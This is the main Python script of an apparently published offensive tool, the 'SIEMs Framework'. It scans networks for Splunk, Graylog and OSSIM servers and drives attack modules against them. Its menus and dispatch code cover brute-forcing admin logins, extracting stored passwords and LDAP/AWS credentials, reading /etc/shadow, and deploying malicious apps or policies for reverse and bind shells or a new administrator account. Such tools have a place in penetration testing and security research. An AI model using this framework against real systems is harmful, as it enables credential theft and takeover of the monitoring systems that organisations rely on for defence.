#!/usr/bin/env python3

"""
------------------------------------------------------------------------------
	SIEMS FRAMEWORK - Julio 2019 - Yamila Levalle @ylevalle
------------------------------------------------------------------------------
"""

#%%%%%%%%%%% Libraries %%%%%%%%%%%#

import sys
import os
import splunklib.client as client
import getpass
import colorama
from colorama import Fore, Back, Style
from scanning import input_ip, scan_network, scan_host
from splunk.obtainsysteminfo import obtainsysteminfo
from splunk.obtainpwds import obtaincredentials
from splunk.installshell import installapp
from splunk.bruteforcesplunk import bruteforcesplunk
from splunk.readfile import readfile
from splunk.obtainsplunkinfo import obtainsplunkinfo
from ossim.bruteforceossim import ossimbrute
from ossim.obtainconfigossim import ossimconfig
from ossim.maliciousaction import createpolicy, generatesshevent
from graylog.bruteforcegraylog import graylogbrute
from graylog.testcredentialsgraylog import testwebcredentials, testsshcredentials
from graylog.obtainmongodbcredentials import testmongocredentials
from graylog.obtaincredentialsrestapi import obtainldapcredentials

#%%%%%%% Context Variables %%%%%%%#

version = 1.0
separator = "[*] ============================================================================================================== [*]"

#%%%%%%%%%%% Functions %%%%%%%%%%%#

def banner():
	b = """
   _____ _____ ______ __  __       ______                                           _    
  / ____|_   _|  ____|  \/  |     |  ____|                                         | |   
 | (___   | | | |__  | \  / |___  | |__ _ __ __ _ _ __ ___   _____      _____  _ __| | __
  \___ \  | | |  __| | |\/| / __| |  __| '__/ _` | '_ ` _ \ / _ \ \ /\ / / _ \| '__| |/ /
  ____) |_| |_| |____| |  | \__ \ | |  | | | (_| | | | | | |  __/\ V  V / (_) | |  |   < 
 |_____/|_____|______|_|  |_|___/ |_|  |_|  \__,_|_| |_| |_|\___| \_/\_/ \___/|_|  |_|\_\
                                                                                         

MultiSIEM Modular Python3 Attack Framework 
By ElevenPaths https://www.elevenpaths.com/                                                                                   
Usage: python3 ./siemsframework.py                                                         
"""
	print(Fore.CYAN+Style.BRIGHT+b)

def parse_args():
	argnumber = len(sys.argv)
	arg = sys.argv[1]
	return arg

#%%%%%%%%%% Menu %%%%%%%%%#

def print_main_menu():

	print(separator)
	print(Fore.CYAN+Style.BRIGHT+"[!] Select from the menu:")
	print(separator)

	main_menu = ["	[1] Scan and Detect SIEM",
				 "	[2] Find SIEMs on the network",
				 "	[3] Update SIEMs Framework",
				 "	[4] Update Supporting Components",
				 "	[0] Exit SIEMs Framework"]

	for i in main_menu:
		print(i)

	print(separator)
	choice = input(Fore.CYAN+Style.BRIGHT+"[!] Enter your selection: "+Style.RESET_ALL)

	return choice

def print_attack_menu(siemdetected):

	print(separator)
	print(Fore.CYAN+Style.BRIGHT+"[!] Select attack from the menu:")
	print(separator)

	splunk_menu = ["	[1] Dictionary Attack on Splunk Server or Universal Forwarder User Admin via Management Port",
				 "	[2] Obtain Server and Session Information via Web Interface",
				 "	[3] Obtain Server or Universal Forwarder System Information via Management Port (Admin Credentials Needed)",
				 "	[4] Obtain Splunk Server Apps Stored Passwords with Secret (Admin Credentials Needed)",
				 "	[5] Read /etc/shadow file from Splunk Server (Linux Only - Admin Credentials Needed)",
				 "	[6] Deploy Malicious App to Forwarders via Deployment Server (Admin Credentials Needed)",
				 "	[7] Upload Malicious App to Splunk Server or Universal Forwarder (Admin Credentials Needed)",
				 "	[0] Return to Main Menu"]

	graylog_menu = ["	[1] Dictionary Attack on Graylog Web Interface User Admin",
				 "	[2] Test for AMI/OVA Default Credentials",
				 "	[3] Test connection to MongoDB and Obtain Credentials for LDAP and AWS",
				"	[4] Obtain Configuration and Credentials for LDAP and AWS from REST API (Admin Credentials Needed)",
				 "	[0] Return to Main Menu"]

	ossim_menu = ["	[1] Dictionary Attack on OSSIM Web Interface User Admin",
				  "	[2] Obtain OSSIM Server Configuration Information (Admin Credentials Needed)",
				  "	[3] Upload OSSIM Malicious Policy and Action to Obtain Reverse Shell (Admin Credentials Needed)",
				  "	[0] Return to Main Menu"]

	if (siemdetected == "Splunk"):
		for i in splunk_menu:
			print(i)

	if (siemdetected == "Graylog"):
		for i in graylog_menu:
			print(i)

	if (siemdetected == "OSSIM"):
		for i in ossim_menu:
			print(i)

	print(separator)
	choice = input(Fore.CYAN+Style.BRIGHT+"[!] Enter your selection: "+Style.RESET_ALL)

	return choice

def print_app_menu(siemdetected):

	print(separator)
	print(Fore.CYAN+Style.BRIGHT+"[!] Select attack from the menu:")
	print(separator)

	app_menu = ["	[1] Linux Splunk Server or Universal Forwarder Reverse Shell",
				 "	[2] Linux Splunk Server or Universal Forwarder Bind Shell",
				 "	[3] Windows Splunk Server Reverse Shell",
				 "	[4] Windows Splunk Server Bind Shell",
				 "	[5] Windows Splunk Universal Forwarder Add Administrator User",
				 "	[6] Windows Splunk Universal Forwarder Executable Bind Shell",
				 "	[0] Return to Attack Menu"]

	for i in app_menu:
		print(i)

	print(separator)
	choice = input(Fore.CYAN+Style.BRIGHT+"[!] Enter your selection: "+Style.RESET_ALL)

	return choice

#%%%%%%%%%% Menu Choices %%%%%%%%%#

def attack_choice(siemdetected,ip):

	choiceerror = 0
	attackchoice = print_attack_menu(siemdetected)
	if (siemdetected == "Splunk" and attackchoice == "1"): #Bruteforce Splunk Admin
		bruteforcesplunk(ip)
	elif (siemdetected == "Splunk" and attackchoice == "2"): #Obtain Server Information
		obtainsplunkinfo(ip)
	elif (siemdetected == "Splunk" and attackchoice == "3"): #Obtain System Information
		obtainsysteminfo(ip)
	elif (siemdetected == "Splunk" and attackchoice == "4"):  #Obtain Splunk Passwords
		obtaincredentials(ip)
	elif (siemdetected == "Splunk" and attackchoice == "5"):  #Read /etc/shadow
		readfile(ip)
	elif (siemdetected == "Splunk" and attackchoice == "7"):  #Upload Malicious App
		app_choice(siemdetected,ip)
	elif (siemdetected == "Graylog" and attackchoice == "1"):  #Bruteforce Graylog
		graylogbrute(ip)
	elif (siemdetected == "Graylog" and attackchoice == "2"):  #Test Default Credentials
		testwebcredentials(ip)
		testsshcredentials(ip)
	elif (siemdetected == "Graylog" and attackchoice == "3"):  #Test MongoDB
		testmongocredentials(ip)
	elif (siemdetected == "Graylog" and attackchoice == "4"):  #Obtain credentials from API
		obtainldapcredentials(ip)
	elif (siemdetected == "OSSIM" and attackchoice == "1"):  #Bruteforce OSSIM
		ossimbrute(ip)
	elif (siemdetected == "OSSIM" and attackchoice == "2"):  #Obtain Configuration
		ossimconfig(ip)
	elif (siemdetected == "OSSIM" and attackchoice == "3"):  #Malicious Policy and Action
		createpolicy(ip)
	elif (attackchoice == "0"):  #Return
		main_choice()
	else:
		print("[!] Choice error please select again:")
		attack_choice(siemdetected, ip)
		choiceerror = 1

	if (attackchoice != "0" and choiceerror != 1): #Not return and not error

		choice3 = input(Fore.CYAN+Style.BRIGHT+"[!] Do you want to return to the attack menu (Y/N): "+Style.RESET_ALL)

		if (choice3 == "Y" or choice3 == "y"):
			attack_choice(siemdetected,ip)
		else:
			main_choice()

def app_choice(siemdetected,ip):

	appchoice = print_app_menu(siemdetected)
	appname = "None"

	if (siemdetected == "Splunk" and appchoice == "1"): #Linux Reverse Shell
		appname="rshell.tar.gz"
	if (siemdetected == "Splunk" and appchoice == "2"): #Linux Bind Shell
		appname = "bshell.tar.gz"
	if (siemdetected == "Splunk" and appchoice == "3"): #Windows Reverse Shell
		appname = "wrshell.tar.gz"
	if (siemdetected == "Splunk" and appchoice == "4"):  #Windows Bind Shell
		appname = "wbshell.tar.gz"
	if (siemdetected == "Splunk" and appchoice == "5"):  #Windows UF Add User
		appname = "wadduser.tar.gz"
	if (siemdetected == "Splunk" and appchoice == "6"):  #Windows UF Bind Shell
		appname = "wbshellexe.tar.gz"
	if (appchoice == "0"):  #Return
		attack_choice(siemdetected, ip)

	if (appchoice != "0" and appname != "None"): #Not return and valid app selection

		installapp(ip,appname)

		choice3 = input(Fore.CYAN+Style.BRIGHT+"[!] Do you want to return to the attack menu (Y/N): "+Style.RESET_ALL)

		if (choice3 == "Y" or choice3 == "y"):
			attack_choice(siemdetected,ip)
		else:
			main_choice()

def main_choice():

	choice = print_main_menu()
	siemdetected = "None"
	siemsdetected = {}

	if (choice == "1"): #Scan and Detect SIEM

		ip = input_ip()
		siemdetected = scan_host(ip)
		choice2 = input(Fore.CYAN+Style.BRIGHT+"[!] Do you want to launch the "+siemdetected+" attack module (Y/N): "+Style.RESET_ALL)

		if (choice2 == "Y" or choice2 == "y"):
			attack_choice(siemdetected,ip)

		else:
			main_choice()

	elif (choice == "2"): #Find SIEM on the Network

		ips = scan_network()

		print(separator)
		print(Fore.CYAN+Style.BRIGHT+"[!] SIEMs Detected on the Network:")
		print(separator)

		for host in ips:
			siemdetected = scan_host(host)
			siemsdetected[host] = siemdetected

		siemchoice = input(Fore.CYAN+Style.BRIGHT+"[!] Enter the IP address of the SIEM to attack: "+Style.RESET_ALL)
		choice2 = input(Fore.CYAN + Style.BRIGHT + "[!] Do you want to launch the " + siemsdetected[siemchoice] + " attack module (Y/N): " + Style.RESET_ALL)

		if (choice2 == "Y" or choice2 == "y"):
			attack_choice(siemsdetected[siemchoice], siemchoice)

		else:
			main_choice()

	elif (choice == "0"):
		quit()

	else:
		print("[!] Choice error please select again:")
		main_choice()

#%%%%%%%%%% Main %%%%%%%%%#

def main():
	os.system('cls' if os.name == 'nt' else 'clear')
	colorama.init(autoreset="True")
	banner()
	main_choice()

main()

#%%%%%%%%%% The End %%%%%%%%%%#


